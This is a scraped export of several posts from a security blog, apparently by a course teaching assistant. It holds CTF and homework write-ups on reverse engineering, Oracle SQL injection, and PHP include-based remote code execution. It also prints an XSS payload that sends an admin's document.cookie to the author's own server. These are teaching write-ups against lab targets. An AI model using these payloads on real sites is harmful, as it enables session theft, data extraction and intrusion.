std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(v19);// while v13 != v14 這個迴圈會把輸入的每個字都拿出來while ( (unsigned __int8)__gnu_cxx::operator!=&lt;jstmt_t **,std::vector&lt;jstmt_t *&gt;&gt;(&amp;v13, &amp;v14) ) &#123; // v12 = *v13; 拿出當前的 char v12 = *(char *)sub_21E6((__int64)&amp;v13); v15 = v16; // 在環上找到第 char*7 個 node， for ( j = 0; j &lt; 7 * v12; ++j ) v15 = v15-&gt;next; // 把自己的值記錄上去，但把原本的值 &lt;&lt; 6 來保留重複的字 v15-&gt;value = v9++ + (v15-&gt;value &lt;&lt; 6); // v13++; sub_21C6(&amp;v13); &#125; 學院派解法 (?)所以 input 的每個字會按照順序被標記在環上，其實就是取模的概念，假設輸入A，就會在環上面走 ord(&#39;A&#39;)*7 = 65*7 = 455 步，但是因為只有 314 個點（0~313）所以我們會走到 141 號 node： $$65*7=455 \\\\ 455\\%314=141$$ 又因為 7 跟 314 互質，所以我們可以直接做逆運算得到每一個位置是什麼，例如剛剛的A我們可以從 141 逆推： $$?*7\\equiv 141\\mod 314\\\\?\\equiv 141*7^{-1}\\mod 314\\\\141*45\\mod314\\\\\\text{(7 在 mod 314 下的模反元素是 45 可以參考 exgcd)}\\\\25418\\equiv65\\mod314$$ 推出原本的字是chr(65)=&#39;A&#39;，照這樣就可以寫腳本了： solve.py12345678910target = &quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 511847092 0 0 0 0 0 0 48 0 0 0 0 0 0 0 40984114273074 0 0 0 0 0 280 0 0 0 0 0 0 26022 26 0 0 0 0 0 0 2035 0 0 0 0 0 0 15 0 0 0 0 0 0 53 0 0 0 0 0 0 47 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 42350 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 0 0 0 0 0 29201 0 0 0 0 0 0 805 0 0 0 0 0 1 939 0 0 0 0 0 0 13 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 7739889 0 0 0 0 0 0 1251 0 0 0 0 0 0 45 0 0 0 0 0 0 2950300 0 0 0 0 0 2 23 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 0 0 0 0 0 0 0 0 0 0 5 0 0 0 0 0 0 0 0 0 0 0 0 0 55 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0&quot;.split(&#x27; &#x27;)flag = [&#x27;&#x27;]*100for number,value in enumerate(map(int,target)): while value : idx = value&amp;0b111111 #只拿最低6位，因為 Uroboros 每次加新的值會 &lt;&lt; 6 flag[idx] = chr((number*45)%314) value = value &gt;&gt; 6print(&#x27;&#x27;.join(flag)) Flag: AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125; 但也可以把每個 printable 都先 *7%314 就可以知道對應的值了拉 野獸流解法 (?)本來沒有印使用者輸入所產生的環長怎樣，但覺得這樣 debug 難度好像有點躍升，所以最後還是印出來了，所以這裡就有另外一個解法（我好像沒看到有人這樣解），就是可以先黑箱測試知道輸入是怎麼樣呈現在環上面的，之後就可以進行 byte by byte 爆破，拿來跟正解比比看就知道當前這一 byte 對不對了。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"TIL::AVX Base64","slug":"TIL-AVX-Base64","date":"2020-01-27T15:39:12.000Z","updated":"2020-01-27T16:46:48.000Z","comments":true,"path":"tw/TIL-AVX-Base64/","permalink":"http://blog.terrynini.tw/tw/TIL-AVX-Base64/","excerpt":"雖然不是 TIL 了，總之在解 flare-on 2019 的時候也有遇到一題包裝成 vm 題的 AVX 運算的 base64，當初沒有發現直接當作加密流程逆著算，看到 flag 才知道是 base64 ….","text":"雖然不是 TIL 了，總之在解 flare-on 2019 的時候也有遇到一題包裝成 vm 題的 AVX 運算的 base64，當初沒有發現直接當作加密流程逆著算，看到 flag 才知道是 base64 …. 透過 AVX2 讓大量運算可以同時執行，加速到幾乎跟 memcpy 一樣快，原始的 paper 及 github ， 另外還有透過其他種 SIMD 的運算（AVX2, AVX512F, AVX512BW …等等）來加速的做法 github。","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Base64","slug":"Base64","permalink":"http://blog.terrynini.tw/tags/Base64/"},{"name":"AVX","slug":"AVX","permalink":"http://blog.terrynini.tw/tags/AVX/"}]},{"title":"程式安全::HW4 Write-up","slug":"程式安全-HW4-Write-up","date":"2019-12-17T20:40:22.000Z","updated":"2021-03-22T19:21:37.000Z","comments":true,"path":"tw/程式安全-HW4-Write-up/","permalink":"http://blog.terrynini.tw/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW4-Write-up/","excerpt":"2019 年交大程式安全 HW4 write-up哈哈是我拉😎😎😎助教拉🤙🤙🤙","text":"2019 年交大程式安全 HW4 write-up哈哈是我拉😎😎😎助教拉🤙🤙🤙 Cathubv2本題的漏洞在影片的頁面（點進去任意一支影片的地方），url 裡的 vid 會被背後的 OracleDB 抓去搜尋，我們可以猜想到影片連結與標題應該是從DB撈出來的，所以我們可能可以透過 UNION 的方式來直接把資訊印出來，這裡可以先測試有幾個 column : vid=-1 union select 1,null from dual 要注意的是空白會被阻擋，所以我們要把空白置換成 /**/ 或是 %0a 來繞過檢查，同時也可以發現 &#39; 跟 chr 也會被擋下來，最後我們可以知道總共有三個欄位： vid=-1 union select 1,null,null from dual 通過測試可以知道，第二個欄位是影片標題，這裡我們可以去撈 oracleDB 的 metadata 來找有趣的 table 名： vid=-1 union select null,table_name,null from user_tables offset 1 rows fetch first 1 rows onlyvid=-1 union select null,table_name,null from user_tables offset 2 rows fetch first 1 rows onlyvid=-1 union select null,table_name,null from user_tables offset 3 rows fetch first 1 rows only... 會發現撈出名為 S3CRET 的 table，這時我們可以嘗試去看他有什麼 column，前面提到 &#39; 被擋住所以無法直接使用 where table_name=&#39;S3CRET&#39;，簡單使用 () 做另外一次 query 就可以正常使用 where 了： vid=-1 union select null,column_name,null from user_tab_columns where table_name=(select table_name from user_all_tables offset 5 rows fetch first 1 rows only)offset 1 rows fetch first 1 rows only 可以找到有一個 column 叫做 V3RY_S3CRET_C0LUMN，所以現在只要把該 column 的值都撈出來就好了： select V3RY_S3CRET_COLUMN from S3CRET offset 1 rows fetch first 1 rows only... 然後就可以拿到 flag 了。 how2xss繞過方式同這個 writeup，這裡較特別的就是 window.name，在一個 window 裡面載入的 document 事實上是共用一個 window.name，每個載入的 document 都可以去讀寫他，所以如果題目沒對 window.name 做過修改的話，他會使用上一個頁面的 window.name ，這樣我們可以不用用 iframe 去多做一個 window ，所以我們可以在我們的 server 上放 payload ，讓 admin 直接造訪 payload 所在的網址，而不一定要 iframe: terrynini.tw&lt;script&gt;window.name=&quot;document.location=&#x27;https://terrynini.tw/&#x27;+document.cookie&quot;;window.location=&quot;https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\\\u&#123;65&#125;)%3E&quot;;&lt;/script&gt; 然後直接回報 terrynini.tw 給 admin，這樣 window.location 跳轉之後，其實我們 window.name 還是會被保存，如此透過本來頁面的 xss 漏洞來觸發 svg/onload 裡的 eval 去造訪我們的 server，如此可以在自己 server 上的 apache access log 看到 admin bot 造訪了什麼 uri，也就是 document.cookie。 12&#x2F;25 補充看了大家繳交的 writeup 其實不太確定大家是不是有理解原理….，因為這題較混亂，所以這次作業評分有解釋清楚的人會多一個 + 號，分數之後再討論，總括來說會有兩種 payload ，一種是像上述 writeup 一樣使用 &lt;iframe src=/\\PSHTA.ML&gt; 讓 admin 訪問，第二種是直接把 javascript 所在的網址給 admin 去訪問。主要差別在於，如果回報給 admin 的網址必須也得是 https://edu-ctf.kaibro.tw:30678/hackme.php?q= 的話，那我們就必須使用 iframe 的方式不可，但這題其實沒有這個限制，所以不需要多繞一個 iframe 來完成，可以直接傳網址就好了。 因為不知道大家是不是有發現可以回報外部網域，writeup 的語意可能有誤會，所以這裡不用 A/B 來評分，就讓有解釋清楚的人多點分數這樣子。 在其他部分，這兩種 payload 其實沒有差別， iframe 跟直接存取網址一樣，都有跨域拿 cookie 的問題，所以我們不能在 iframe 裡面直接拿 cookie，必須把 admin 導回同網域 (edu-ctf.kaibro.tw) 中有 Reflected XSS 漏洞的頁面，這裡利用 window.name 跨域的特性所以可以夾帶我們真實的 payload 來繞過 filter。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"2019::Flare-On 6::Record","slug":"2019-Flare-On-6-Record","date":"2019-12-04T02:05:01.000Z","updated":"2021-02-08T06:37:04.000Z","comments":true,"path":"en/2019-Flare-On-6-Record/","permalink":"http://blog.terrynini.tw/en/2019-Flare-On-6-Record/","excerpt":"Finished all 12 challenges of Flare-On 6, this year’s challenge seem’s to be more friendly than last year.So it’ my first year to finish all challenges, the second year I play Flare-On.","text":"Finished all 12 challenges of Flare-On 6, this year’s challenge seem’s to be more friendly than last year.So it’ my first year to finish all challenges, the second year I play Flare-On. Cuz I didn’t write my memo during the contest, it’s a time-consuming task to review them all. So this article is not a write-up, just some images. The challenge 12 take me some time to understand what’s going on, even baked a cake to calm me down, and yes, that work !I am the 290th to finish all 12 challenges And the badge !","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"程式安全::HW3 Write-up","slug":"程式安全-HW3-Write-up","date":"2019-11-20T16:16:23.000Z","updated":"2021-03-22T19:21:10.000Z","comments":true,"path":"tw/程式安全-HW3-Write-up/","permalink":"http://blog.terrynini.tw/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW3-Write-up/","excerpt":"2019 年交大程式安全 HW3 write-up哈哈是我拉😎😎😎助教拉🤙🤙🤙","text":"2019 年交大程式安全 HW3 write-up哈哈是我拉😎😎😎助教拉🤙🤙🤙 Unexploitable [100 point]Recon簡單檢查一下網頁原始碼，可以發現網頁很簡單，只有 Matrix rain 特效的 javascript 還有一個檢查 konami 秘技的 k.js，cookie 的部分也沒有什麼好看的，來檢查一下 header 可以發現該網頁可能是架在 github 上的某個靜態網站。 $ curl -kI https://unexploitable.kaibro.tw/HTTP/2 200server: GitHub.comcontent-type: text/html; charset=utf-8last-modified: Thu, 17 Oct 2019 10:11:00 GMTetag: &quot;5da83e34-4f2&quot;access-control-allow-origin: *expires: Wed, 20 Nov 2019 17:32:45 GMTcache-control: max-age=600x-proxy-cache: MISSx-github-request-id: C7D4:5C02:1DA1BF:25B879:5DD57664accept-ranges: bytesdate: Wed, 20 Nov 2019 17:22:46 GMTvia: 1.1 varnishage: 0x-served-by: cache-hkg17931-HKGx-cache: MISSx-cache-hits: 0x-timer: S1574270566.811443,VS0,VE228vary: Accept-Encodingx-fastly-request-id: bc1e55a82c40be45132ceda0c55024153b3be9fbcontent-length: 1266 又或者是在訪問 url ，例如 https://unexploitable.kaibro.tw/test ，時可能會得到錯誤： 感覺 github 上應該有藏寶，嘗試先找到 repo，透過 dig 指令找到 unexploitable.kaibro.tw. 是 bucharesti.github.io. 的 CNAME： $ dig unexploitable.kaibro.tw; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; unexploitable.kaibro.tw;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36406;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 8, ADDITIONAL: 13;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;unexploitable.kaibro.tw. IN A;; ANSWER SECTION:unexploitable.kaibro.tw. 3078 IN CNAME bucharesti.github.io.bucharesti.github.io. 3078 IN A 185.199.109.153bucharesti.github.io. 3078 IN A 185.199.110.153bucharesti.github.io. 3078 IN A 185.199.111.153bucharesti.github.io. 3078 IN A 185.199.108.153 找到 repo 後可以發現目前的版本是沒有 flag 的，查看 commit 紀錄可以發現有條 commit message 是 delete secret file: 可以在裡面找到 flag : FLAG&#123;baby_recon_dont_forget_to_look_github_page&#125; Safe R&#x2F;W [200 point]Recon首先閱讀一下 source code，可以知道流程大概是： 根據使用者指紋建立一個 sandbox 可指定要建立的資料夾名稱 $f，waf 檢查不包含 . / - 任一字元 可指定要被 include 的檔案名稱 $i，waf 檢查不包含 ph 字串 可指定要往檔案 meow 寫入的內容 $c，waf 檢查長度不超過 20 bytes 刪除資料夾 由於 5. 會刪除資料夾，所以我們必須要在 @include($i); 的時候就讓他執行 php 程式碼，或者是直接把 flag include 進來，但是作業有說 open_basedir=/var/www/html/ 可以直接假設 flag 在這個資料夾之外，所以先不考慮第二條路。 到這裡可以發現我們首先要解決的難點是如何通過這個檢查，讓我們可以把 &lt;?php 塞進去我們要 include 的檔案來 RCE： stripos(file_get_contents($i), &#x27;&lt;&#x27;) === FALSE Exploit首先我有個大膽的想法，第一行測不到 &#39;&lt;?php&#39;，第四行又跑出 &#39;&lt;?php&#39; 不就洗洗睡了嗎 if(isset($i) &amp;&amp; stripos(file_get_contents($i), &#x27;&lt;&#x27;) === FALSE) &#123; echo &quot;&lt;div class=&#x27;container&#x27;&gt;&quot;; echo &quot;&lt;h2&gt;Here is your file content:&lt;/h2&gt;&quot;; @include($i); echo &quot;&lt;/div&gt;&quot;;&#125; 看到 file_get_contents 應該會想到各種 protocols 跟 wrappers，接下來可以透過 php -a 打開 php 的 interactive shell 做簡單的測試，php 在 defualt 的情況下對於開檔還有 include 的設置如下： phpinfo();...allow_url_fopen =&gt; On =&gt; Onallow_url_include =&gt; Off =&gt; Off 一個有開一個沒開，也就是說我們可能可以透過 protocols&#x2F;wrapper 來讓檢查的內容與實際上被呈現的內容產生不一致，這裡可以枚舉各種支援的 protocols&#x2F;wrapper，然後既然都給 source code 了，直接整份拿下來架起來 debug 最快，這裡順手打開 error message： ini_set(&#x27;display_errors&#x27;,&#x27;1&#x27;);error_reporting(E_ALL); 假設遇到不支援（包括未開啟），預設會使用 file:// 也就是直接當檔案讀，所以可以透過下列方式來測試是否可以利用： 大部分的 protocols&#x2F;wrapper 都需要在 config php 的時候開啟，基本上不期待遠端有打開，試下去感覺也是沒有，本來猜想簡單的 http: 跟 http:///meow 應該可以騙過 file_get_contents 去拿取外部資源，然後在 include 時被當作路徑，但會發現雖然 include 沒啟用 url 但是遇到 data:// 跟 http:// 還是會吐錯誤給你，可以發現我們的輸入不會被當作路徑，反而會是說這個 protocol 不允許然後直接爛掉 Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/asdfasdfasdfasdf.php on line 46Warning: include(data://meow): failed to open stream: no suitable wrapper could be found in /var/www/html/asdfasdfasdfasdf.php on line 46Warning: include(): Failed opening &#x27;data://meow&#x27; for inclusion (include_path=&#x27;.:/usr/share/php&#x27;) in /var/www/html/asdfasdfasdfasdf.php on line 46 試到 data:// 的時候可以看到下面有個人在 11 年前告訴你 data: 也是支援的，在 local 測一下 data:跟 data:/meow 的組合： Warning: file_get_contents(data:/meow): failed to open stream: rfc2397: no comma in URL in /var/www/html/asdfasdfasdfasdf.php on line 41 發現他會在 file_get_contents 時吃 warning 但是 include卻沒噴東西出來！！所以這裡可以透過有殘缺的 data: 形式讓 file_get_contents 打不開檔案導致回傳 false 從而通過判斷： php &gt; $i = &quot;zzz&quot;;php &gt; var_dump(file_get_contents($i));Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1bool(false)php &gt; var_dump(stripos(file_get_contents($i), &#x27;&lt;&#x27;));Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1bool(false) 當然你也可以選擇透過正常的組合來通過判斷 data:, 跟 data:,/meow (data:,/meow 就是 plain text 的 /meow)： php &gt; $i = &quot;data:,/meow&quot;;php &gt; var_dump(file_get_contents($i));string(5) &quot;/meow&quot;php &gt; var_dump(stripos(file_get_contents($i), &#x27;&lt;&#x27;) );bool(false) 到這裡我們就可以 RCE 了： 當然可以用 20 byte 的 payload 就把 flag 猜出來但還是有點不自由，有牆就要爬一下，這邊拿上課教的東西隨便戳個: php &gt; $c = array(&#x27;ls&#x27;,&#x27; -la &#x27;,&#x27; ../../../&#x27;);php &gt; var_dump(strlen($c) &gt; 20);bool(false)php &gt; file_put_contents(&quot;meow&quot;, $c);php &gt; echo file_get_contents(&quot;meow&quot;);ls -la ../../../ 然後你就可以愛怎麼打怎麼打： https://edu-ctf.csie.org:10155/?f=data%3A&amp;i=data%3A%2Fmeow&amp;c[]=%3C%3Fphp+echo+%60cat+../../../../../../../../../../../../../../../../../../flag_is_here%60%3B flag: FLAG&#123;w3lc0me_t0_th3_PHP_W0r1d&#125; Other Solution前面提到的主要思路就是： 我有個大膽的想法，第一行測不到 &#39;&lt;?php&#39;，第四行又跑出 &#39;&lt;?php&#39; 這可以透過 race condition 來達成，因為一四行間讀取的時間差，還有根據相同的 ip ， useragent 我們會一直存取到同一個資料夾，透過多個 client 我們可以撞到幾次他檢查完我們又把內容改掉，讓已經通過檢查的 server 去 include 我們修改過的 meow。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"TIL::Windows Services Debug","slug":"TIL-Windows-Services-Debug","date":"2019-07-01T05:40:06.000Z","updated":"2019-07-27T10:22:31.000Z","comments":true,"path":"tw/TIL-Windows-Services-Debug/","permalink":"http://blog.terrynini.tw/tw/TIL-Windows-Services-Debug/","excerpt":"trace 了一隻很 G8 的程式，順手記錄一下在 windows 下，怎麼 attach 到一隻服務上面動態 debug。","text":"trace 了一隻很 G8 的程式，順手記錄一下在 windows 下，怎麼 attach 到一隻服務上面動態 debug。 在 windows 下可以在 HKLM\\SYSTEM\\CurrentControlSet\\Services 註冊服務，之後可以使用指令 net start ServiceName 來啟動該服務。Microsoft 官方介紹了很多 Debug 方法，但是在 Vista 的版本之後，因為服務都被放進 session0，所以 Debug 基本上只能透過 remote 或是 kernel 控制的 usermode debugger。 安裝 Windows 官方 SDK 的 debug tool 後，透過 Global flag 來綁定程式啟動時自動 attach 的 Debugger ，設定成 cdb 讓 service 掛著，就可以從 WinDbg remote debug 該服務。 有些服務是把 ImagePath 設定成 %SYSTEMROOT%\\System32\\svchost.exe -k netsvcs -p ，透過 svchost 載入 ServiceDll 來啟動服務，這時候我們 attach 到的會是 svchost.exe，要找到正確的入口點可以先在 dll 被載入時中斷： sxe ld nameofdll.dll 同時因為 dll 一定有 Export 一個 ServiceMain 的 Entry 給 svchost 來執行，所以可以在 Entry 上面下斷點，就可以重頭開始 trace： bm /a nameofdll!* 必讀資源： WinDbg Commands Debugging Malware with WinDbg Debugging Windows Services","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Windows","slug":"Windows","permalink":"http://blog.terrynini.tw/tags/Windows/"}]},{"title":"2019::AIS3::前測官方解","slug":"2019-AIS3-前測官方解","date":"2019-06-15T17:04:28.000Z","updated":"2020-12-05T08:57:16.000Z","comments":true,"path":"tw/2019-AIS3-前測官方解/","permalink":"http://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/","excerpt":"2019 AIS3 pre-exam 由我出題的部分的解題流程。題目的原始碼以及下面提到的解法腳本這裡是解題統計，給大家做個參考。","text":"2019 AIS3 pre-exam 由我出題的部分的解題流程。題目的原始碼以及下面提到的解法腳本這裡是解題統計，給大家做個參考。 WTF這題其實沒有打算要考什麼，就是測試一下大家的神通力？題目給了一推 png，簡單地用各種工具應該是測不出什麼 stego 的鬼東西，這時候如果你願意近一點看的話會發現它就是一臉迷宮樣： 這時你腦袋裡應該飛出幾個 DFS，BFS之類的演算法，然而你並不知道起點跟終點，不知道要從哪走到哪，事實上如果你真的走出來應該也是一坨屎，這時候題目有個好像沒啥鬼用的提示 תיבת נח，恩，他是諾亞方舟的意思，一個你解完才會知道這是什麼意思的提示。總之這題其實跟 FloodFill 有關，你可以考慮雕一個簡單的腳本，或是，更簡單的，用小畫家的填充工具就好了。如果你都很懶，我已經寫好一個放在 github 裡面了拿來跑跑看就知道了，結果大概是像這樣子： Trivialreconbinary 只會檢查你的輸入長度是否是 60，如果符合的話，就會把 flag 複製到剛剛用來輸入的 buffer，但是不會列印出來，比較 naive 的方法就是看懂 code 然後把 flag 手動拼回來，直覺又快速的做法是使用 gdb。 solvegdb-peda$ b putsgdb-peda$ run &lt;&lt;&lt; `python -c &#x27;print(&quot;a&quot;*60)&#x27;`gdb-peda$ find AIS3Searching for &#x27;AIS3&#x27; in: None rangesFound 7 results, display max 7 items:Trivial : 0x555555554798 (rex.B)[stack] : 0x7fffffffdb90 (&quot;AIS3&#123;This_is_a_rea&quot;, &#x27;l&#x27; &lt;repeats 11 times&gt;, &quot;y_boariiing_challenge&#125;aaaaaaaaa&quot;)[stack] : 0x7fffffffe06e (&quot;AIS3_2019_staff/Trivial/Trivial&quot;)[stack] : 0x7fffffffe174 (&quot;AIS3_2019_staff/Trivial&quot;)[stack] : 0x7fffffffe82c (&quot;AIS3_2019_staff/Trivial&quot;)[stack] : 0x7fffffffef86 (&quot;AIS3_2019_staff/Trivial/Trivial&quot;)[stack] : 0x7fffffffefd8 (&quot;AIS3_2019_staff/Trivial/Trivial&quot;) AIS3&#123;This_is_a_reallllllllllly_boariing_challenge&#125; TsaiBrorecon基本上就是 Tap code，每個發財後面跟著不同數量的.，每兩個可以對應找出一個單字，例如發財.發財.是a，發財.發財..是b，寫個解碼的腳本就好了。 solvesolve.py#!/usr/bin/env python3table = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;_&#x27;]f = open(&quot;./flag.txt&quot;,&quot;r&quot;).read().split(&#x27;\\n&#x27;)[1]f = f.split(&quot;發財&quot;)[1:]for i in range(0,len(f),2): print(table[(len(f[i])-1)*8+len(f[i+1])-1],end=&#x27;&#x27;) HolyGrenaderecon這題給的是一個 pyc 檔案，裡面是 python 的 bytecode，可以用 uncompyle 之類的工具把他弄回 python 的樣子，弄回來之後會是一份被混淆過的 python script solvedecompileHolyGrenade.pyfrom secret import flagfrom hashlib import md5if 64 - 64: i11iIiiIiidef OO0o ( arg ) : arg = bytearray ( arg , &#x27;ascii&#x27; ) for Oo0Ooo in range ( 0 , len ( arg ) , 4 ) : O0O0OO0O0O0 = arg [ Oo0Ooo ] iiiii = arg [ Oo0Ooo + 1 ] ooo0OO = arg [ Oo0Ooo + 2 ] II1 = arg [ Oo0Ooo + 3 ] arg [ Oo0Ooo + 2 ] = II1 arg [ Oo0Ooo + 1 ] = O0O0OO0O0O0 arg [ Oo0Ooo + 3 ] = iiiii arg [ Oo0Ooo ] = ooo0OO return arg . decode ( &#x27;ascii&#x27; ) if 64 - 64: Oooo % OOO0O / II1Ii / Oooflag += b&quot;0&quot; * ( len ( flag ) % 4 )if 63 - 63: iI11i11IiIiII + oo00oOOo * Oooo000o % OOo . OOOfor Oo0Ooo in range ( 0 , len ( flag ) , 4 ) : print ( OO0o ( md5 ( bytes ( flag [ Oo0Ooo : Oo0Ooo + 4 ] ) ) . hexdigest ( ) ) ) if 27 - 27: Iii1IIIiiI + iI - Oo / iII11iiIII111 % iiiIIii1I1Ii . O00oOoOoO0o0O deobfuscate最好的方法就是，手動把它修好 XD，總之修好之後大概長這樣 source.pyfrom secret import flagfrom hashlib import md5def rearrange( arg ): arg = bytearray(arg,&#x27;ascii&#x27;) for i in range(0,len(arg),4): a = arg[i] b = arg[i+1] c = arg[i+2] d = arg[i+3] arg[i+2] = d arg[i+1] = a arg[i+3] = b arg[i] = c return arg.decode(&#x27;ascii&#x27;)flag += b&quot;0&quot;*(len(flag)%4)for i in range(0,len(flag),4): print(rearrange(md5(bytes(flag[i:i+4])).hexdigest())) decode可以看得出來，flag 的每 4 個字元被拿去做 md5 之後又被重新排列了一次，所以把題目給的output.txt修復好之後，送上線上的 md5 網站就可以拿回 flag 了 solve.py#!/usr/bin/env python3f = open(&quot;output.txt&quot;,&#x27;r&#x27;).read().split(&#x27;\\n&#x27;)[:-1]def rearrange( arg ): arg = bytearray(arg,&#x27;ascii&#x27;) for i in range(0,len(arg),4): a = arg[i] b = arg[i+1] c = arg[i+2] d = arg[i+3] arg[i+1] = d arg[i+2] = a arg[i] = b arg[i+3] = c return arg.decode(&#x27;ascii&#x27;)for i in f: print(rearrange(i)) md5 crack拿結果去餵 https://hashkiller.co.uk/Cracker/MD5 aab3fb739ad2d154fe856818d66b6427 MD5 AIS3 343e0b500b25058ed52de927ca6bbd87 MD5 &#123;7he dc719b0b22f0fc5a6dfbfc0ee60c70a8 MD5 re_1 cd9e8edd75eb88b7873d9eab7dd685fe MD5 5_th 6d740b3c874058ca047ab375ecb662f6 MD5 e_k1 18fed6fa3fcf748e9530a6e10296c446 MD5 ll3r 73d9c19bea1d91abb5f0f4eb24e9f567 MD5 _ra6 a05e1b0e95d57c4566877d1b7eb27872 MD5 61t&#125; or osCommerce 61:t&#125; 0neWayrecon簡單分析可以發現，這個 binary 會問你三個問題來驗證你的身份，驗證的方法是把你所有的回答串接再一起後丟進一個很像是 hash 的 function 中計算，即 hash(ans1||ans2||ans3) == 8932587927620123215，同時也會計算其長度是否符合 hash(strlen(ans1||ans2||ans3)) == 177593，而這個很像 hash 的 function，它事實上就是一個功能正常的小巧 djb2 hash function，也就是符合 onewayness，無法直接逆推。 在對這個 hash function 一無所知的情況下，其實 google 算式就能找到了，再者，透過簡單的實驗應該可以發現，這個 hash 並沒有明顯可以逆運算的特徵，而字串長度也讓暴力破解法時間成本很高，因此這時候應該考慮的事情是，這整個加密的過程，還有哪裡是脆弱的。 觀察程式流程，可以發現如果通過 hash 的驗證，程式將會以循環 xor 的方式來解碼一個 jpg 檔案，而我們知道 jpg 是有特定 header 的，$jpg\\oplus key &#x3D; cipher$ 所以做逆運算就可以得到 key，$cipher \\oplus jpg &#x3D; key$，但事實上並不需要如此費工。 key leak因為 jpeg 有一段 App makers 的標籤，這裡有連續重複的 0x20，所以導致 cipher 中 leak 了 key， 仔細看 cipher 的 hex 就會發現不遠的地方有一段 data 長這樣 ： 4550 4554 4e49 4e49 1212 4944 4944 4e4f EPETNINI..IDIDNO5448 4156 4550 4554 4e49 4e49 1212 4944 THAVEPETNINI..ID4944 4e4f 5448 4156 4550 4554 4e49 4e49 IDNOTHAVEPETNINI1212 4944 4944 4e4f 5448 4156 4550 4554 ..IDIDNOTHAVEPET4e49 4e49 1212 4944 4944 4e4f 5448 4156 NINI..IDIDNOTHAV4550 4554 4e49 4e49 1212 4944 4944 4e4f EPETNINI..IDIDNO5448 4156 4550 4554 4e49 4e49 1212 4944 THAVEPETNINI..ID4944 4e4f 5448 4156 4550 4554 4e49 4e49 IDNOTHAVEPETNINI1212 4944 4944 4e4f 5448 4156 4550 4554 ..IDIDNOTHAVEPET4e49 4e49 1212 4944 4944 4e4f 5448 4156 NINI..IDIDNOTHAV... solve要求驗證的時候有說過全部小寫，所以不難發現這一段 data 有被 xor 0x20，還原後可以知道三段驗證的答案是 